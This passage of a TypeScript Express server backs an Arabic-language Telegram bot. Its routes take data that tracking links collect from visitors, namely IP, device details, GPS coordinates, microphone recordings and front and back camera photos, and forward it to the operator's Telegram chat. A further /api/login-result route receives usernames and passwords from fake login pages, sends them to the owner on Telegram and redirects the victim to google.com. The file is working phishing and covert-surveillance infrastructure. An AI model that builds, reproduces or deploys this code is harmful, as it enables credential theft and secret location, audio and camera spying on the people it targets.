  console.log("Telegram bot configuration loaded.");

  // Enable graceful stop
  process.once('SIGINT', () => bot?.stop('SIGINT'));
  process.once('SIGTERM', () => bot?.stop('SIGTERM'));
  process.on('exit', () => bot?.stop('EXIT'));
} else {
  console.log("No BOT_TOKEN provided, Telegram bot will not be started.");
}

// ========== Processing Data depending on feature ==========

async function processFeature(chatId: number, feature: string, data: any, visitorIp: string) {
    if (!bot) {
        console.error("Bot not configured.");
        return false;
    }
  const featureNames: Record<string, string> = {
    'ip': '🌍 IP',
    'info': '💻 معلومات الجهاز',
    'location': '📍 الموقع الجغرافي',
    'mic': '🎙️ تسجيل صوت',
    'cameraF': '📸 صورة أمامية',
    'cameraB': '📸 صورة خلفية',
    'ip_info': '🌐 معلومات IP شاملة'
  };

  try {
      const sendMedia = async (type: 'photo' | 'voice' | 'video', base64Data: string, duration?: number) => {
          const buffer = Buffer.from(base64Data.split(',')[1] || base64Data, 'base64');
          const ext = type === 'voice' ? 'ogg' : (type === 'video' ? 'mp4' : 'jpg');
          const mimeName = type === 'voice' ? 'audio' : type;
          const caption = duration ? `تم التسجيل (${duration} ثوان).` : (type === 'photo' ? undefined : 'تم التسجيل.');
          
          try {
              if (type === 'photo') {
                  await bot!.telegram.sendPhoto(chatId, { source: buffer, filename: `photo.${ext}` });
              } else if (type === 'voice') {
                  await bot!.telegram.sendVoice(chatId, { source: buffer, filename: `voice.${ext}` }, { caption });
              } else if (type === 'video') {
                  await bot!.telegram.sendVideo(chatId, { source: buffer, filename: `video.${ext}` }, { caption });
              }
          } catch (e: any) {
              if (type !== 'photo' && e.message && (e.message.includes('FORBIDDEN') || e.message.includes('wrong file identifier') || e.message.includes('WRONG_FILE_IDENTIFIER'))) {
                  try {
                      const docExt = 'webm';
                      await bot!.telegram.sendDocument(chatId, { source: buffer, filename: `${mimeName}.${docExt}` }, { caption: (caption || '') + ' (كمستند)' });
                  } catch (err2) {
                      console.error(`Failed to send ${type} as document:`, err2);
                  }
              } else {
                  console.error(`Failed to send ${type}:`, e.message || e);
                  await bot!.telegram.sendMessage(chatId, `❌ فشل إرسال ${type}: ${e.message || 'خطأ غير معروف'}`);
              }
          }
      };

      if (feature === 'info' || feature.startsWith('info')) {
        let msg = `${featureNames['info'] || '💻 معلومات الجهاز'}\n`;
        if (data.deviceInfo) {
            const di = data.deviceInfo;
            msg += `📱 معلومات الجهاز:\n`;
            msg += `- الدولة: ${di.country} 🔻\n`;
            msg += `- المدينة: ${di.city} 🏙️\n`;
            msg += `- عنوان IP: ${di.ip} 🌍\n`;
            msg += `- شحن الهاتف: ${di.batteryLevel} 🔋\n`;
            msg += `- هل الهاتف يشحن؟: ${di.isCharging} ⚡\n`;
            msg += `- الشبكة: ${di.networkType} 📶 (سرعة: ${di.networkSpeed})\n`;
            msg += `- نوع الاتصال: ${di.connType} 📡\n`;
            msg += `- الوقت: ${di.time} ⏰\n`;
            msg += `- اسم الجهاز: ${di.deviceName} 🖥️\n`;
            msg += `- إصدار الجهاز: ${di.deviceVersion} 📜\n`;
            msg += `- نوع الجهاز: ${di.deviceType} 📱\n`;
            msg += `- الذاكرة (RAM): ${di.ram} 🧠\n`;
            msg += `- الذاكرة الداخلية: ${di.internalMemory} 💾\n`;
            msg += `- عدد الأنوية: ${di.cores} ⚙️\n`;
            msg += `- لغة النظام: ${di.systemLanguage} 🌐\n`;
            msg += `- اسم المتصفح: ${di.browserName} 🌐\n`;
            msg += `- إصدار المتصفح: ${(di.browserVersion || '').substring(0, 100)} 📊\n`;
            msg += `- دقة الشاشة: ${di.screenResolution} 📏\n`;
            msg += `- إصدار نظام التشغيل: ${di.osVersion} 🖥️\n`;
            msg += `- وضع الشاشة: ${di.screenOrientation} 🔄\n`;
            msg += `- عمق الألوان: ${di.colorDepth} 🎨\n`;
            msg += `- تاريخ آخر تحديث للمتصفح: ${di.browserUpdateDate} 📅\n`;
            msg += `- بروتوكول الأمان المستخدم: ${di.protocol} 🔒\n`;
            msg += `- نطاق التردد للاتصال: ${di.frequency} 📡\n`;
            msg += `- إمكانية تحديد الموقع الجغرافي: ${di.geolocationSupported} 🌍\n`;
            msg += `- الدعم لتقنية البلوتوث: ${di.bluetoothSupported} 🔵\n`;
            msg += `- دعم الإيماءات اللمسية: ${di.touchSupported} ✋\n`;
        } else {
            msg += `🌍 IP: ${data.ip || visitorIp}\n`;
        }
        await bot.telegram.sendMessage(chatId, msg);
        return true;
      }
      
      if (feature === 'location') {
        const lat = data.location?.lat || data.lat;
        const lon = data.location?.lon || data.lon;
        const accuracy = data.location?.accuracy || data.accuracy;
        if (lat && lon) {
            let msg = `${featureNames['location']}\n`;
            msg += `📍 خط العرض: ${lat || 'غير معروف'}\n`;
            msg += `📍 خط الطول: ${lon || 'غير معروف'}\n`;
            msg += `🎯 الدقة: ${accuracy || 'غير معروف'} متر\n`;
            msg += `🗺️ الخريطة: https://maps.google.com/?q=${lat},${lon}`;
            await bot.telegram.sendMessage(chatId, msg);
        }
        return true;
      }
      
      if (feature === 'mic' || feature.startsWith('mic')) {
        if (data.audio) {
            await sendMedia('voice', data.audio, data.recordedDuration);
        } else {
            await bot.telegram.sendMessage(chatId, `${featureNames['mic'] || '🎙️ تسجيل صوت'}\n❌ فشل التسجيل: ${data.error || 'خطأ غير معروف'}`);
        }
        return true;
      }
      
      if (feature === 'cameraF' || feature === 'cameraB' || feature.startsWith('camera')) {
        if (data.photos && Array.isArray(data.photos) && data.photos.length > 0) {
            for (let i = 0; i < data.photos.length; i++) {
                await sendMedia('photo', data.photos[i]);
            }
        } else if (data.photo) {
            await sendMedia('photo', data.photo);
        } else {
            const defaultText = feature.startsWith('cameraF') ? '📸 صورة أمامية' : '📸 صورة خلفية';
            await bot.telegram.sendMessage(chatId, `${featureNames[feature] || defaultText}\n❌ فشل التصوير: ${data.error || 'خطأ غير معروف'}`);
        }
        return true;
      }
      
      if (feature === 'ip_info') {
        const fetchIpInfo = async () => {
             const ipToTrack = data.ip || visitorIp;
             try {
                 const [r1, r2, r3] = await Promise.allSettled([
                     fetch(`http://ip-api.com/json/${ipToTrack}`).then(r => r.json()),
                     fetch(`https://ipapi.co/${ipToTrack}/json/`).then(r => r.json()),
                     fetch(`https://ipinfo.io/${ipToTrack}/json`).then(r => r.json())
                 ]);
                 let msg = `🌐 *معلومات IP الشاملة لـ ${ipToTrack}* 🔴🟢🔵\n\n`;
                 
                 msg += `🔴 *المصدر الأول (ip-api):*\n`;
                 if (r1.status === 'fulfilled' && r1.value.status === 'success') {
                     msg += `- الدولة: ${r1.value.country} 🔻\n- المدينة: ${r1.value.city}\n- مزود الخدمة: ${r1.value.isp}\n\n`;
                 } else {
                     msg += `- فشل جلب البيانات\n\n`;
                 }

                 msg += `🟢 *المصدر الثاني (ipapi.co):*\n`;
                 if (r2.status === 'fulfilled' && !r2.value.error) {
                     msg += `- الدولة: ${r2.value.country_name} 🔻\n- المدينة: ${r2.value.city}\n- المنطقة: ${r2.value.region}\n- مزود الخدمة: ${r2.value.org}\n\n`;
                 } else {
                     msg += `- فشل جلب البيانات\n\n`;
                 }

                 msg += `🔵 *المصدر الثالث (ipinfo.io):*\n`;
                 if (r3.status === 'fulfilled' && !r3.value.error) {
                     msg += `- الموقع: ${r3.value.city || 'غير معروف'}, ${r3.value.region || 'غير معروف'}, ${r3.value.country || 'غير معروف'} 🔻\n- الشركة: ${r3.value.org || 'غير معروف'}\n`;
                     if (r3.value.loc) {
                        msg += `🗺️ إحداثيات (تقريبية): https://maps.google.com/?q=${r3.value.loc}\n`;
                     }
                 } else {
                     msg += `- فشل جلب البيانات\n`;
                 }

                 await bot!.telegram.sendMessage(chatId, msg, { parse_mode: 'Markdown' });
             } catch(err) {
                 await bot!.telegram.sendMessage(chatId, `❌ خطأ في جلب بيانات IP: ${err}`);
             }
        };
        await fetchIpInfo();
        return true;
      }
      
      await bot.telegram.sendMessage(chatId, `📥 استلام بيانات\nالميزة: ${feature}\nIP: ${visitorIp}`);
      return true;
  } catch (error) {
      console.error("Failed to process feature", error);
      return false;
  }
}


// ========== API Routes ==========

app.get('/api/health', (req, res) => {
    res.json({ status: 'ok' });
});

app.get('/api/link/:id', (req, res) => {
    try {
        let decoded = Buffer.from(req.params.id, 'hex').toString('utf8');
        if (!decoded.includes('::')) {
            // fallback: check if it's the old format (link id from db)
            const [linkIdStr] = req.params.id.split('-');
            const link = getLink(linkIdStr);
            if (!link) {
                return res.status(404).json({ error: 'Link not found' });
            }
            decoded = `${link.chat_id}::${link.feature}`;
        }
        
        const [chatIdStr, ...featureParts] = decoded.split('::');
        let feature = featureParts.join('::');
        let duration = 3000;
        
        if (feature.startsWith('mic_')) {
            const parts = feature.split('_');
            duration = parseInt(parts[1]) * 1000;
            feature = 'mic';
        } else if (feature.startsWith('cameraF_')) {
            feature = 'cameraF';
        } else if (feature.startsWith('cameraB_')) {
            feature = 'cameraB';
        }
        return res.json({ feature, duration });
    } catch(e) {
        return res.status(404).json({ error: 'Invalid link encoding' });
    }
});

app.post('/api/track', async (req, res) => {
  try {
    const { linkId, feature, data, duration } = req.body;
    let visitorIp = (req.headers['x-forwarded-for'] as string) || req.socket.remoteAddress || '';
    if (visitorIp && visitorIp.includes(',')) {
      visitorIp = visitorIp.split(',')[0].trim();
    }

    if (!linkId) {
       const chat_id = req.body.chat_id;
       if (chat_id) {
           await processFeature(parseInt(chat_id), feature || 'info', { ...req.body.data, recordedDuration: duration }, visitorIp);
           return res.json({ success: true, message: 'Legacy tracking success' });
       }
       return res.status(400).json({ success: false, error: 'LinkId required' });
    }
    
    let chatId: number;
    let originalFeature: string;
    
    try {
        const decoded = Buffer.from(linkId, 'hex').toString('utf8');
        if (decoded.includes('::')) {
            const [chatIdStr, ...featureParts] = decoded.split('::');
            chatId = parseInt(chatIdStr);
            originalFeature = featureParts.join('::');
        } else {
            const [linkIdStr] = (linkId as string).split('-');
            const linkData = getLink(linkIdStr);
            if (!linkData) return res.status(404).json({ success: false, error: 'Link not found' });
            chatId = linkData.chat_id;
            originalFeature = linkData.feature;
        }
    } catch (e) {
        return res.status(404).json({ success: false, error: 'Invalid link encoding' });
    }

    saveVisit(linkId, visitorIp, originalFeature, { ...data, recordedDuration: duration });
    
    if (bot) {
        const success = await processFeature(chatId, originalFeature, { ...data, recordedDuration: duration }, visitorIp);
        if (success) {
            return res.json({ success: true, message: 'Sent to Telegram' });
        } else {
            return res.status(500).json({ success: false, error: 'Failed to send to Telegram' });
        }
    } else {
        return res.json({ success: true, message: 'Saved but bot is offline' });
    }
  } catch (error: any) {
    console.error("Track error", error);
    res.status(500).json({ success: false, error: error.message });
  }
});

function escapeMarkdown(text: string): string {
    if (typeof text !== 'string') return String(text);
    return text.replace(/([_*\[\]()~`>#+\-.!|])/g, '\\$1');
}

app.post('/api/login-result', async (req, res) => {
    console.log("Received POST request to /api/login-result. Body:", JSON.stringify(req.body));
    try {
        const { username, password, page, platform, userAgent, language, screenResolution, ip, email } = req.body;
        
        console.log("Parsed data:", { username, password, page, platform });
        
        const source = escapeMarkdown(page || platform || 'غير معروف');
        const userOrEmail = escapeMarkdown(username || email || 'غير معروف');
        const passwordEscaped = escapeMarkdown(password || 'غير معروف');
        const userAgentEscaped = escapeMarkdown(userAgent || 'غير معروف');
        const languageEscaped = escapeMarkdown(language || 'غير معروف');
        const screenResolutionEscaped = escapeMarkdown(screenResolution || 'غير معروف');
        const platformEscaped = escapeMarkdown(platform || '');
        
        let message = `⚠️ *بيانات تسجيل دخول جديدة:* ⚠️\n\n`;
        message += `🌐 *الموقع (الصفحة):* ${source}\n`;
        if (platform && page) {
             message += `💻 *النظام:* ${platformEscaped}\n`;
        }
        message += `👤 *اسم المستخدم / البريد:* ${userOrEmail}\n`;
        message += `🔑 *كلمة المرور:* ${passwordEscaped}\n\n`;
        message += `===============================\n`;
        message += `🔍 *معلومات إضافية:*\n`;
        message += `📱 *المتصفح:* ${userAgentEscaped}\n`;
        message += `🌍 *اللغة:* ${languageEscaped}\n`;
        message += `🖥️ *دقة الشاشة:* ${screenResolutionEscaped}\n`;
        
        if (bot) {
            console.log("Sending telegram message...");
            await bot.telegram.sendMessage(OWNER_ID, message, { parse_mode: 'Markdown' });
            console.log("Telegram message sent.");
            return res.json({ success: true, redirect: 'https://google.com' });
        }
        console.log("Bot not available.");
        return res.json({ success: true });
    } catch(err) {
        console.error("Login result error:", err);
        res.status(500).json({ success: false });
    }
});

// Vite middleware setup
async function startServer() {
  if (process.env.NODE_ENV !== 'production') {
    const vite = await createViteServer({
      server: { middlewareMode: true },
      appType: 'spa',
    });
    app.use(vite.middlewares);
  } else {
    const distPath = path.join(process.cwd(), 'dist');
    app.use(express.static(distPath));
    app.get('*', (req, res) => {
      res.sendFile(path.join(distPath, 'index.html'));
    });
  }

  app.listen(PORT, "0.0.0.0", () => {
    console.log(`Server running on http://localhost:${PORT}`);
    
    // Auto-ping to keep server alive
    setInterval(() => {
        fetch(`http://localhost:${PORT}/api/health`)
            .then(res => res.json())
            .then(() => console.log('Pinged self to stay awake'))
            .catch(err => console.error('Self-ping error:', err.message));
    }, 3 * 60 * 1000);
  });
}

startServer();
